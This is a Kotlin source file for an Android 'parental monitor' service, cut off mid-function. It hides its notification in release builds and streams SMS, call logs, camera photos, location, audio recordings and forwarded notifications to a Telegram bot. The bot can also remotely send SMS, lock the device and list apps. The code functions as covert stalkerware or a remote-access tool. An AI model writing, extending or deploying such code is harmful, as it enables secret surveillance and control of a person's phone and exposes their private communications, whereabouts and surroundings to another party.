package com.redeye.parentalmonitor.service

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redeye.parentalmonitor.ParentalMonitorApp
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.utils.CrashReporter
import com.redeye.parentalmonitor.utils.Html
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.repository.CallLogRepository
import com.redeye.parentalmonitor.repository.SmsRepository
import com.redeye.parentalmonitor.utils.NetworkUtils
import com.redeye.parentalmonitor.utils.TimeFmt
import kotlinx.coroutines.*
import android.os.BatteryManager
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

class MonitoringService : Service() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var messageQueue: MessageQueue
    private lateinit var cameraService: CameraService
    
    private val scopeErrorHandler = CoroutineExceptionHandler { _, error ->
        try {
            CrashReporter.saveNow(this, error)
        } catch (_: Exception) {
        }
        android.util.Log.e("MonitoringService", "Background failure recorded", error)
    }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + scopeErrorHandler)
    private val cameraBusy = AtomicBoolean(false)
    private var watchdogJob: Job? = null
    private var loopWatchdogJob: Job? = null
    private var loopWatchdogNoticeAt = 0L
    private var serviceStartAt = 0L
    private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
    private var monitoringJob: Job? = null
    private var cameraJob: Job? = null
    private var commandJob: Job? = null
    private var initialSyncJob: Job? = null
    private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
    private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
    private var cachedBotToken = ""
    private var cachedChatId = ""
    private var credsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
    private var credsCheckAt = 0L
    private var netCheckAt = 0L
    private var netCached = false

    companion object {
        const val ACTION_START_MONITORING = "START_MONITORING"
        const val ACTION_STOP_MONITORING = "STOP_MONITORING"
        private const val NOTIFICATION_ID = 1
        private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
    }

    override fun onCreate() {
        super.onCreate()
        try { PreferencesManager.refreshInstance(this) } catch (_: Exception) { }
        preferencesManager = PreferencesManager.getInstance(this)
        refreshCreds()
        credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == "bot_token" || key == "chat_id") refreshCreds()
            if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until") restartCameraLoop()
        }
        try { preferencesManager.registerChangeListener(credsListener!!) } catch (_: Exception) { }
        smsRepository = SmsRepository(this)
        callLogRepository = CallLogRepository(this)
        messageQueue = MessageQueue(this)
        cameraService = CameraService(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_MONITORING -> startMonitoring()
            ACTION_STOP_MONITORING -> stopMonitoring()
            else -> {
                if (shouldAutoResume()) {
                    startMonitoring()
                } else {
                    stopSelf()
                }
            }
        }
        return START_STICKY
    }

    private fun shouldAutoResume(): Boolean {
        return try {
            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
    }


    private fun redactToken(value: String?): String {
        if (value.isNullOrEmpty()) return value ?: ""
        val token = try {
            cachedBotToken.ifEmpty { preferencesManager.botToken }
        } catch (_: Exception) {
            ""
        }
        if (token.isEmpty()) return value
        return value.replace(token, "***")
    }

    private fun startMonitoring() {
        serviceStartAt = System.currentTimeMillis()
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")

        // Cancel any previous loops so a restart never duplicates work
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        refreshCreds()
        
        // In RELEASE mode, make notification invisible/minimal
        val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
        
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
            // DEBUG: Show detailed notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
        } else {
            // RELEASE: Minimal/hidden notification
            notificationBuilder
                .setContentTitle("")
                .setContentText("")
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setSilent(true)
        }

        var foregroundTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (hasCameraPermission()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (hasMicPermission()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        if (hasLocationPermission() && hasBackgroundLocation()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        val foregroundNotification = try {
            notificationBuilder.build()
        } catch (_: Exception) {
            stopSelf()
            return
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, foregroundNotification, foregroundTypes)
            } else {
                startForeground(NOTIFICATION_ID, foregroundNotification)
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Foreground start failed, retrying minimal", e)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        foregroundNotification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } else {
                    startForeground(NOTIFICATION_ID, foregroundNotification)
                }
            } catch (_: Exception) {
                stopSelf()
                return
            }
        }
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
        if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
            serviceScope.launch {
                sendToTelegram("Storage fallback active: secure storage unavailable, data kept in volatile memory until Setup is reopened.")
            }
        }

        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
            preferencesManager.initialSyncStarted = true
            initialSyncRunning.set(true)
        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
            initialSyncRunning.set(true)
        }
        startPeriodicLoops()
        initialSyncJob = serviceScope.launch {
            try {
                if (initialSyncRunning.get()) {
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
                    sendInitialData()
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
                }
            } catch (_: Exception) {
            } finally {
                initialSyncRunning.set(false)
            }
        }
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
        try {
            messageQueue.tryRestorePersistent()
        } catch (_: Exception) {
        }
        val stuckRing = preferencesManager.ringPrevVolume
        if (stuckRing >= 0) {
            try {
                val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
                audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, stuckRing, 0)
            } catch (_: Exception) {
            }
            preferencesManager.ringPrevVolume = -1
        }
        startCommandPolling()
        startLoopWatchdog()
        MessageScheduler.scheduleMessageSend(this)
        serviceScope.launch {
            registerBotCommands()
        }
    }

    private fun startPeriodicLoops() {
        monitoringJob = serviceScope.launch {
            while (isActive && monitoringJob === coroutineContext[Job]) {
                try {
                    if (!preferencesManager.monitoringPaused) {
                        checkAndSendNewData()
                    }
                    delay(syncIntervalMillis())
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
                }
            }
        }
        startCameraLoop()
    }

    private fun restartCameraLoop() {
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        startCameraLoop()
    }

    private fun startCameraLoop() {
        cameraJob = serviceScope.launch {
            while (isActive && cameraJob === coroutineContext[Job]) {
                try {
                    val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
                    if (!preferencesManager.monitoringPaused && !isPhotoPaused() && minutes > 0) {
                        captureAndSendPhoto()
                        chunkedDelay(minutes * 60_000L)
                    } else if (preferencesManager.monitoringPaused) {
                        chunkedDelay(5 * 60_000L)
                    } else {
                        val remaining = preferencesManager.photoPausedUntil - System.currentTimeMillis()
                        val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
                        chunkedDelay(idle)
                    }
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in camera loop", e)
                }
            }
        }
    }

    private suspend fun chunkedDelay(totalMs: Long) {
        var remaining = totalMs
        if (remaining <= 0L) return
        while (remaining > 0) {
            currentCoroutineContext().ensureActive()
            delay(minOf(remaining, 60_000L))
            remaining -= 60_000L
        }
    }

    private fun cameraIntervalMillis(): Long {
        val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
        return if (minutes <= 0) 60_000L else minutes * 60_000L
    }

    private fun refreshCreds() {
        try {
            cachedBotToken = preferencesManager.botToken
            cachedChatId = preferencesManager.chatId
        } catch (_: Exception) {
        }
    }

    private fun sendCreds(): Pair<String, String> {
        if (cachedBotToken.isEmpty() || cachedChatId.isEmpty()) refreshCreds()
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - credsCheckAt > 300_000L) {
            credsCheckAt = now
            refreshCreds()
        }
        return cachedBotToken to cachedChatId
    }

    private fun hasNetwork(): Boolean {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - netCheckAt < 20_000L) return netCached
        netCheckAt = now
        netCached = NetworkUtils.isNetworkAvailable(this)
        return netCached
    }

    // ═══════════════════════════════════════════════════════════
    // TELEGRAM COMMAND POLLING (/photo, /status, /help)
    // ═══════════════════════════════════════════════════════════

    private var idlePolls = 0

    private fun startCommandPolling() {
        commandJob = serviceScope.launch {
            while (isActive && commandJob === coroutineContext[Job]) {
                try {
                    val active = pollTelegramCommands()
                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(6)
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error polling commands", e)
                }
                if (!preferencesManager.isConfigured()) {
                    try {
                        if (PreferencesManager.refreshInstance(this@MonitoringService)) {
                            preferencesManager = PreferencesManager.getInstance(this@MonitoringService)
                            refreshCreds()
                        }
                    } catch (_: Exception) {
                    }
                    delay(60_000)
                } else if (!hasNetwork()) {
                    delay(60_000)
                } else if (authBlocked()) {
                    delay(300_000)
                } else {
                    delay(15_000L + idlePolls * 2_500L)
                }
            }
        }
    }

    private fun authBlocked(): Boolean {
        return try {
            val err = preferencesManager.credentialError
            if (err.isEmpty()) return false
            val now = android.os.SystemClock.elapsedRealtime()
            if (now < preferencesManager.credentialErrorAt) {
                preferencesManager.credentialError = ""
                preferencesManager.credentialErrorAt = 0L
                return false
            }
            now - preferencesManager.credentialErrorAt < 30 * 60_000L
        } catch (_: Exception) {
            false
        }
    }

    private suspend fun pollTelegramCommands(): Boolean {
        if (authBlocked()) return false
        val (botToken, chatId) = sendCreds()
        if (botToken.isEmpty() || chatId.isEmpty()) return false

        val offset = preferencesManager.lastUpdateId + 1
        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"

        val response = try {
            TelegramClient.api.getUpdates(url)
        } catch (e: Exception) {
            return false
        }
        if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
            try {
                preferencesManager.credentialError = response.code().toString()
                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
            } catch (_: Exception) {
            }
            return false
        }
        if (!response.isSuccessful || response.body()?.ok != true) return false
        try {
            preferencesManager.credentialError = ""
            preferencesManager.credentialErrorAt = 0L
        } catch (_: Exception) {
        }

        val updates = response.body()?.result ?: return false
        for (update in updates) {
            try {
                val callback = update.callbackQuery
                if (callback != null) {
                    handleCallbackQuery(callback)
                    continue
                }
                val message = update.message ?: continue
                if (message.chat.id.toString() != chatId) continue
                val full = message.text?.trim() ?: continue
                val raw = full.substringBefore("@").lowercase()
                if (!raw.startsWith("/")) continue
                val input = if (raw == "/sms" || raw.startsWith("/sms ")) {
                    val smsArg = full.substringAfter(" ", "").trim()
                    if (smsArg.isEmpty()) "/sms" else "/sms $smsArg"
                } else raw
                handleTelegramCommand(input, message.date)
            } finally {
                if (update.updateId > preferencesManager.lastUpdateId) {
                    preferencesManager.lastUpdateId = update.updateId
                }
            }
        }
        return updates.isNotEmpty()
    }

    private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
        val sender = query.from?.id?.toString() ?: return
        if (sender != preferencesManager.chatId) return
        answerCallback(query.id)
        val command = when (query.data) {
            "photo" -> "/photo"
            "location" -> "/location"
            "lastcalls" -> "/lastcalls"
            "lastsms" -> "/lastsms"
            "battery" -> "/battery"
            "status" -> "/status"
            "stop" -> "/stop"
            "resume" -> "/resume"
            "camfront" -> "/camera depan"
            "camback" -> "/camera belakang"
            "pause60" -> "/pause 60"
            else -> return
        }
        handleTelegramCommand(command)
    }

    private suspend fun answerCallback(callbackId: String) {
        try {
            val token = sendCreds().first.ifEmpty { preferencesManager.botToken }
            val url = "https://api.telegram.org/bot${token}/answerCallbackQuery"
            TelegramClient.api.answerCallbackQuery(url, mapOf("callback_query_id" to callbackId))
        } catch (_: Exception) {
        }
    }

    private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
        return listOf(
            com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera depan|belakang"),
            com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
            com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
            com.redeye.parentalmonitor.network.BotCommand("lastsms", "Show last 5 SMS"),
            com.redeye.parentalmonitor.network.BotCommand("photointerval", "Set photo interval 0-60 min"),
            com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
            com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
            com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
            com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
            com.redeye.parentalmonitor.network.BotCommand("syncinterval", "Set sync interval 1-1440 min"),
            com.redeye.parentalmonitor.network.BotCommand("restart", "Restart monitoring loops"),
            com.redeye.parentalmonitor.network.BotCommand("flush", "Send queued messages now"),
            com.redeye.parentalmonitor.network.BotCommand("clearqueue", "Drop queued messages"),
            com.redeye.parentalmonitor.network.BotCommand("lock", "Lock device screen"),
            com.redeye.parentalmonitor.network.BotCommand("ring", "Ring device aloud"),
            com.redeye.parentalmonitor.network.BotCommand("ping", "Check bot delay"),
            com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-60 s"),
            com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms nomor pesan"),
            com.redeye.parentalmonitor.network.BotCommand("lastnotif", "Show last notifications"),
            com.redeye.parentalmonitor.network.BotCommand("version", "Show app/device version"),
            com.redeye.parentalmonitor.network.BotCommand("uptime", "Show service uptime"),
            com.redeye.parentalmonitor.network.BotCommand("contacts", "Search contacts: /contacts nama"),
            com.redeye.parentalmonitor.network.BotCommand("apps", "List installed apps"),
            com.redeye.parentalmonitor.network.BotCommand("storage", "Show storage usage"),
            com.redeye.parentalmonitor.network.BotCommand("history", "Calls+SMS by number"),
            com.redeye.parentalmonitor.network.BotCommand("log", "Show last crash/error log"),
            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
        )
    }

    private suspend fun registerBotCommands() {
        try {
            val botToken = preferencesManager.botToken
            if (botToken.isEmpty()) return
            val tokenHash = botToken.hashCode().toString()
            try {
                if (preferencesManager.commandsTokenHash == tokenHash) return
            } catch (_: Exception) {
            }
            val url = "https://api.telegram.org/bot$botToken/setMyCommands"
            val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
            val response = TelegramClient.api.setMyCommands(url, body)
            if (response.isSuccessful && response.body()?.ok == true) {
                try {
                    preferencesManager.commandsTokenHash = tokenHash
                } catch (_: Exception) {
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
            } else {
                android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
        }
    }

    private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
        fun button(text: String, data: String) =
            com.redeye.parentalmonitor.network.InlineButton(text, data)
        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
            listOf(
                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
                listOf(button("\uD83D\uDCF7 Depan", "camfront"), button("\uD83D\uDCF7 Belakang", "camback")),
                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status"))
            )
        )
    }

    private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L) {
        val parts = raw.split("\\s+".toRegex(), limit = 2)
        val command = parts[0]
        val arg = parts.getOrNull(1)?.trim().orEmpty()
        try {
            handleTelegramCommandInner(command, arg, sentAtSec)
        } catch (e: java.util.concurrent.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Command failed: $command", e)
            try {
                sendToTelegram("\u26A0\uFE0F Command $command failed (${e.message ?: "unknown error"}). Please try again or send /help.")
            } catch (_: Exception) {
            }
        }
    }

    private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L) {
        when (command) {
            "/photo" -> {
                val lens = arg.substringBefore(" ")
                if (lens.isNotEmpty()) {
                    when (lens) {
                        "belakang", "back" -> preferencesManager.cameraFacing = "back"
                        "depan", "front" -> preferencesManager.cameraFacing = "front"
                        else -> {
                            sendToTelegram("Usage: /photo [depan|belakang]")
                            return
                        }
                    }
                }
                if (preferencesManager.monitoringPaused) {
                    sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
                } else {
                    sendToTelegram("📸 Taking photo now…")
                    captureAndSendPhoto(reportResult = true)
                }
            }
            "/status" -> {
                val lastSync = preferencesManager.lastSyncTime
                val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                val photoState = if (isPhotoPaused()) {
                    "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
                } else if (preferencesManager.cameraInterval <= 0) {
                    "manual only (/photo)"
                } else {
                    "every ${preferencesManager.cameraInterval} min"
                }
                sendToTelegram(
                    buildString {
                        appendLine("📊 <b>Status</b>")
                        appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
                        appendLine("Last sync: $lastSyncStr")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Data interval: ${preferencesManager.syncInterval} min")
                        appendLine("Photos: $photoState")
                        appendLine("Camera: ${preferencesManager.cameraFacing}")
                        appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                        appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                        appendLine("Background location: ${if (hasBackgroundLocation()) "granted" else "MISSING"}")
                        appendLine("Notifications: ${if (isNotifForwarding()) "forwarding" else "off"}")
                        appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                    }
                )
            }
            "/lastcalls" -> {
                val calls = callLogRepository.getAllCalls(5).map { call ->
                    if (call.name == null) call.copy(name = callLogRepository.resolveContact(call.number)) else call
                }
                if (calls.isEmpty()) {
                    sendToTelegram("📞 No call history found.")
                } else {
                    sendToTelegram(formatCallMessage(calls))
                }
            }
            "/lastsms" -> {
                val sms = smsRepository.getRecentSms(5)
                if (sms.isEmpty()) {
                    sendToTelegram("💬 No SMS found.")
                } else {
                    sendToTelegram(formatSmsMessage(sms))
                }
            }
            "/photointerval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(0, 60)
                if (minutes == null) {
                    sendToTelegram("Usage: /photointerval \u003c0-60\u003e (0 = manual only)")
                } else if (minutes == 0) {
                    preferencesManager.cameraInterval = 0
                    sendToTelegram("📸 Automatic photos OFF. Use /photo for manual capture.")
                } else {
                    preferencesManager.cameraInterval = minutes
                    sendToTelegram("📸 Photo interval set to $minutes min.")
                }
            }
            "/pause" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 480)
                if (minutes == null) {
                    sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
                } else {
                    preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
                    sendToTelegram("⏸️ Photos paused for $minutes min.")
                }
            }
            "/battery" -> {
                val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
                val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                sendToTelegram("🔋 <b>Battery</b>\nLevel: $level%")
            }
            "/stop" -> {
                preferencesManager.monitoringPaused = true
                sendToTelegram("⏸️ Monitoring paused. Send /resume to restart.")
            }
            "/resume" -> {
                preferencesManager.monitoringPaused = false
                preferencesManager.photoPausedUntil = 0L
                sendToTelegram("▶️ Monitoring resumed.")
            }
            "/location" -> {
                if (!hasLocationPermission()) {
                    sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
                } else {
                    sendToTelegram("📍 Locating…")
                    serviceScope.launch {
                        val location = fetchLocation()
                        if (location == null) {
                            sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
                        } else {
                            sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
                    }
                    }
                }
            }
            "/camera" -> {
                when (arg) {
                    "belakang", "back" -> {
                        preferencesManager.cameraFacing = "back"
                        sendToTelegram("📸 Camera set to back.")
                    }
                    "depan", "front" -> {
                        preferencesManager.cameraFacing = "front"
                        sendToTelegram("📸 Camera set to front.")
                    }
                    else -> {
                        sendToTelegram("Usage: /camera \u003cdepan|belakang\u003e (now: ${preferencesManager.cameraFacing})")
                    }
                }
            }
            "/notif" -> {
                when (arg.lowercase()) {
                    "on" -> {
                        preferencesManager.notifForwardEnabled = true
                        if (isNotifForwarding()) {
                            sendToTelegram("\uD83D\uDD14 Notification forwarding ON.")
                        } else {
                            sendToTelegram("Notif forwarding enabled, but OS notification access is missing. Open Setup and tap Read Notifications to allow it.")
                        }
                    }
                    "off" -> {
                        preferencesManager.notifForwardEnabled = false
                        sendToTelegram("\uD83D\uDD15 Notification forwarding OFF.")
                    }
                    "status", "" -> {
                        val state = if (isNotifForwarding()) "forwarding" else "off"
                        sendToTelegram("\uD83D\uDD14 Notifications: $state (pref: ${if (preferencesManager.notifForwardEnabled) "on" else "off"})")
                    }
                    else -> {
                        sendToTelegram("Usage: /notif <on|off|status>")
                    }
                }
            }
            "/log" -> {
                val crash = try {
                    CrashReporter.pendingReport(this)
                } catch (_: Exception) {
                    null
                }
                if (crash != null) {
                    sendToTelegram(crash)
                } else {
                    sendToTelegram("\uD83E\uDDFE No crash recorded.")
                }
                sendToTelegram(
                    buildString {
                        appendLine("\uD83E\uDDFE <b>Error log</b>")
                        val credErr = try {
                            preferencesManager.credentialError
                        } catch (_: Exception) {
                            ""
                        }
                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "FAILED ($credErr)")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Storage: " + if (preferencesManager.isStorageEncrypted) "encrypted" else "volatile")
                        val camErr = try {
                            preferencesManager.lastCameraErrorNotice
                        } catch (_: Exception) {
                            0L
                        }
                        appendLine("Last camera error: " + if (camErr > 0) formatDate(camErr) else "none")
                        val upErr = try {
                            preferencesManager.lastUploadErrorNotice
                        } catch (_: Exception) {
                            0L
                        }
                        appendLine("Last upload error: " + if (upErr > 0) formatDate(upErr) else "none")
                    }
                )
            }
            "/syncinterval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 1440)
                if (minutes == null) {
                    sendToTelegram("Usage: /syncinterval \u003c1-1440\u003e (minutes)")
                } else {
                    preferencesManager.syncInterval = minutes
                    sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
                }
            }
            "/restart" -> {
                restartAllLoops()
                sendToTelegram("\u267B\uFE0F Loops restarted.")
            }
            "/flush" -> {
                val queued = messageQueue.getQueueSize()
                val scheduled = MessageScheduler.scheduleMessageSend(this)
                if (scheduled) {
                    sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
                } else {
                    sendToTelegram("\u26A0\uFE0F Could not schedule flush ($queued queued).")
                }
            }
            "/clearqueue" -> {
                val queued = messageQueue.getQueueSize()
                try {
                    messageQueue.clearQueue()
                } catch (_: Exception) {
                }
                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped).")
            }
            "/lock" -> {
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                    if (!dpm.isAdminActive(admin)) {
                        sendToTelegram("\u26A0\uFE0F Device Admin not active. Enable it in Setup first.")
                    } else {
                        dpm.lockNow()
                        sendToTelegram("\uD83D\uDD12 Device locked.")
                    }
                } catch (e: SecurityException) {
                    sendToTelegram("\u26A0\uFE0F Cannot lock: Device Admin not active.")
                } catch (e: Exception) {
                    sendToTelegram("\u26A0\uFE0F Lock failed.")
                }
            }
            "/ring" -> {
                val seconds = arg.toIntOrNull()?.coerceIn(5, 60) ?: 15
                serviceScope.launch { ringDevice(seconds) }
            }
            "/ping" -> {
                if (sentAtSec > 0) {
                    val lag = System.currentTimeMillis() / 1000L - sentAtSec
                    sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s.")
                } else {
                    sendToTelegram("\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()))
                }
            }
            "/record" -> {
                val seconds = arg.toIntOrNull()?.coerceIn(5, 60)
                if (seconds == null) {
                    sendToTelegram("Usage: /record \u003c5-60\u003e (seconds)")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
                } else {
                    sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
                    serviceScope.launch { recordAndSendAudio(seconds) }
                }
            }
            "/sms" -> {
                val number = arg.substringBefore(" ").trim()
                val smsText = arg.substringAfter(" ", "").trim()
                if (number.isEmpty() || smsText.isEmpty()) {
                    sendToTelegram("Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
                } else if (!number.matches(Regex("^\\+?[0-9]{5,15}$"))) {
                    sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                } else {
                    try {
                        val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            getSystemService(android.telephony.SmsManager::class.java)
                        } else {
                            android.telephony.SmsManager.getDefault()
                        }
                        if (smsText.length > 160) {
                            smsManager.sendMultipartTextMessage(number, null, smsManager.divideMessage(smsText), null, null)
                        } else {
                            smsManager.sendTextMessage(number, null, smsText, null, null)
                        }
                        sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
                    } catch (e: SecurityException) {
                        sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                    } catch (e: Exception) {
                        sendToTelegram("\u26A0\uFE0F SMS failed.")
                    }
                }
            }
            "/lastnotif" -> {
                val items = try {
                    NotificationForwarderService.history()
                } catch (_: Exception) {
                    emptyList()
                }
                if (items.isEmpty()) {
                    sendToTelegram("\uD83D\uDD14 No notifications recorded yet.")
                } else {
                    sendToTelegram(
                        buildString {
                            appendLine("\uD83D\uDD14 <b>Last notifications</b>")
                            for (item in items.takeLast(10)) {
